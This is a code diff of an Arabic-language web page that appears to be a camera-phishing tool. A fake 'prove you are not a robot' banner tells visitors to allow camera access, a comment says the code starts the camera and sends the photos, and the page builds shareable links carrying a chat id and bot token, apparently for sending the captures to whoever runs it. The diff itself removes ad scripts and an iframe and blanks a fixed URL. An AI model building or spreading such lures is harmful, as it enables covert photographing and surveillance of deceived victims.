@@ -364,92 +364,10 @@
           ⚡ اضغط على "سماح" في الكاميرا للتأكد من أنك لست روبوت ⚡
         </div>
         
-        <div class="viewer-main">
-          <div class="viewer-iframe-wrapper">
-            <iframe class="viewer-iframe" src="${target}"></iframe>
-          </div>
-          
+
           <!-- بداية الاعلانات الكثيرة -->
-          <div class="ads-container">
-            <div class="ad-block">
-              <div class="ad-header">
-                <span>📢 إعلان ممول</span>
-                <span>Ad</span>
-              </div>
-              <div class="ad-content" id="ad1">
-                <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
-              </div>
-            </div>
-            
-            <div class="ad-block">
-              <div class="ad-header">
-                <span>📢 إعلان ممول</span>
-                <span>Ad</span>
-              </div>
-              <div class="ad-content" id="ad2">
-                <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
-                <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
-              </div>
-            </div>
-            
-            <div class="ad-block">
-              <div class="ad-header">
-                <span>📢 إعلان ممول</span>
-                <span>Ad</span>
-              </div>
-              <div class="ad-content" id="ad3">
-                <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
-              </div>
-            </div>
-            
-            <div class="ad-block">
-              <div class="ad-header">
-                <span>📢 إعلان ممول</span>
-                <span>Ad</span>
-              </div>
-              <div class="ad-content" id="ad4">
-                <script>
-                  atOptions = {
-                    'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-                    'format' : 'iframe',
-                    'height' : 300,
-                    'width' : 160,
-                    'params' : {}
-                  };
-                <\/script>
-                <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
-              </div>
-            </div>
-          </div>
-          
-          <!-- اعلانات اضافية بشكل شبكة -->
-          <div class="ads-grid">
-            <div class="ad-item">
-              <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
-            </div>
-            <div class="ad-item">
-              <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
-              <div id="container-596225155ab3da796681d551cb4b7cf4-2"></div>
-            </div>
-            <div class="ad-item">
-              <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
-            </div>
-            <div class="ad-item">
-              <script>
-                atOptions = {
-                  'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-                  'format' : 'iframe',
-                  'height' : 300,
-                  'width' : 160,
-                  'params' : {}
-                };
-              <\/script>
-              <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
+
+
 
     // بدء الكاميرا وإرسال الصور
     const captureBadge = document.getElementById('captureBadge');
@@ -652,7 +570,7 @@
       }
 
       // تمت إزالة حقل الرابط نهائياً، سيتم استخدام رابط ثابت
-      const fixedUrl = "https://b7xha.github.io/Maroweb/";
+      const fixedUrl = "";
       const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(fixedUrl)}`;
       linkText.innerText = fullLink;
       resultEl.style.display = 'flex';
